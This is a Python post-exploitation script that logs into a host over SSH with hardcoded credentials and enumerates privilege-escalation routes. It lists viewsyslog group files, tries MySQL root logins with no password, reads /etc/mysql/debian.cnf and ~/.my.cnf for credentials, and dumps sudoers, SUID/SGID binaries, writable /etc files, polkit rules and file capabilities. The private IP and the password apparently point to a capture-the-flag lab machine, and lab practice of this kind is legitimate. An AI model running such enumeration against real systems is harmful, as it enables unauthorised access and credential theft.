#!/usr/bin/env python3
"""Deep enumeration of viewsyslog group and MySQL local auth vectors"""
import paramiko

TARGET = "192.168.56.113"
USERNAME = "linuxmaster"
PASSWORD = "mercurymeandiameteris4880km"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(TARGET, username=USERNAME, password=PASSWORD, timeout=10)

def run(cmd, label=None):
    if label:
        print(f"\n{'='*60}")
        print(f"  {label}")
        print(f"{'='*60}")
    stdin, stdout, stderr = client.exec_command(cmd)
    out = stdout.read().decode().strip()
    err = stderr.read().decode().strip()
    if out:
        print(out)
    if err and "No such" not in err:
        print(f"[ERR] {err}")
    return out

print("[*] Deep enumeration - viewsyslog & MySQL vectors")

# 1. What does viewsyslog group grant?
run("getent group viewsyslog", "VIEWSYSLOG GROUP MEMBERS")
run("find / -group viewsyslog -type f 2>/dev/null | head -30", "FILES OWNED BY VIEWSYSLOG GROUP")
run("find / -group viewsyslog -type d 2>/dev/null | head -20", "DIRS OWNED BY VIEWSYSLOG GROUP")

# 2. Check /var/log permissions for viewsyslog
run("ls -la /var/log/ 2>&1 | head -30", "VAR LOG PERMISSIONS")
run("find /var/log -group viewsyslog 2>/dev/null | head -20", "LOG FILES VIEWABLE BY GROUP")

# 3. MySQL local auth bypass attempts
run("mysql -u root --socket=/var/run/mysqld/mysqld.sock -e 'SELECT User, Host FROM mysql.user;' 2>&1 | head -20", "MYSQL SOCKET AUTH")
run("mysql -u root -p'' -e 'SELECT User, Host FROM mysql.user;' 2>&1 | head -20", "MYSQL EMPTY PASSWORD")
run("cat /etc/mysql/debian.cnf 2>/dev/null || cat ~/.my.cnf 2>/dev/null || echo 'NO MYSQL CONFIG FOUND'", "MYSQL DEFAULT CONFIGS")

# 4. Check for MySQL credentials in web app configs
run("find /home -name '*.cnf' -o -name '*.conf' -o -name 'settings.py' -o -name 'config.py' 2>/dev/null", "WEB APP CONFIGS")
run("find /var/www -name '*.py' -o -name '*.conf' 2>/dev/null | head -20", "WWW CONFIGS")

# 5. Check if viewsyslog can read sensitive log files
run("ls -la /var/log/mysql/ 2>&1", "MYSQL LOG FILES")
run("cat /var/log/mysql/*.log 2>/dev/null | head -30", "MYSQL LOG CONTENTS")

# 6. Check for any SUID/SGID with viewsyslog connection
run("find / -perm /6000 -type f -exec ls -la {} \\; 2>/dev/null", "ALL SUID/SGID WITH PERMS")

# 7. Check sudoers file directly
run("cat /etc/sudoers 2>/dev/null", "SUDOERS FILE")
run("ls -la /etc/sudoers.d/ 2>/dev/null && cat /etc/sudoers.d/* 2>/dev/null", "SUDOERS.D CONTENTS")

# 8. Check for any writable files in system paths
run("find /etc -writable -type f 2>/dev/null | head -20", "WRITABLE FILES IN ETC")

# 9. Check if we can use pkexec (Polkit) for escalation
run("pkexec --version 2>&1", "PKEXEC VERSION")
run("find /usr/share/polkit-1 -name '*.rules' 2>/dev/null | head -10", "POLKIT RULES")

# 10. Check for any interesting capabilities
run("getcap -r / 2>/dev/null | head -20", "FILE CAPABILITIES")

client.close()
print("\n[+] Deep enumeration complete.")
